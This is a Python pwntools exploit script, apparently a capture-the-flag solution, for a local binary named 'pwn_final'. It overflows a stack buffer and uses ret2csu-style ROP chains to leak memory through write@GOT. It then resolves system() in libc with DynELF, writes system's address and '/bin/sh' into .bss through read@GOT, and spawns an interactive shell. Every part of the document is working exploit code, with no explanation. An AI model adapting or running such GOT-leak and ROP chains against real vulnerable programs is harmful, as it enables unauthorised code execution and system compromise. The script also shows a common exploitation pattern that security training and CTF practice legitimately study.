from pwn import *

# context.log_level = 'debug'

p = process('./pwn_final')
elf = ELF('./pwn_final')

write_got = elf.got['write']
read_got = elf.got['read']
get_name_addr = 0x0000000000400966
init2_addr = 0x0000000000400D80
bss_addr = 0x00000000006020A0
pop6_ret = 0x0000000000400D9A
pad = 'A'*56

def leak(addr):
    p.recvuntil('please enter your name:')
    payload = pad
    payload += p64(pop6_ret)+p64(0)+p64(1)+p64(write_got)+p64(128)+p64(addr)+p64(1)
    payload += p64(init2_addr)+'\x00'*56+p64(get_name_addr)
    p.sendline(payload)
    data = p.recv(128)
    return data

d = DynELF(leak, elf=ELF('./pwn_final'))
system_addr = d.lookup('system','libc')
print "###############system_addr###############"
print hex(system_addr)

payload1 = pad
payload1 += p64(pop6_ret)+p64(0)+p64(1)+p64(read_got)+p64(16)+p64(bss_addr)+p64(0)
payload1 += p64(init2_addr)+'\x00'*56+p64(get_name_addr)

print "###############system('/bin/sh')###############"
p.sendline(payload1)
p.send(p64(system_addr))
p.send('/bin/sh\x00')
# p.recvuntil('name:')

payload2 = pad
payload2 += p64(pop6_ret)+p64(0)+p64(1)+p64(bss_addr)+p64(0)+p64(0)+p64(bss_addr+8)
payload2 += p64(init2_addr)+'\x00'*56+p64(get_name_addr)

print "###############get shell###############"
p.sendline(payload2)

p.interactive()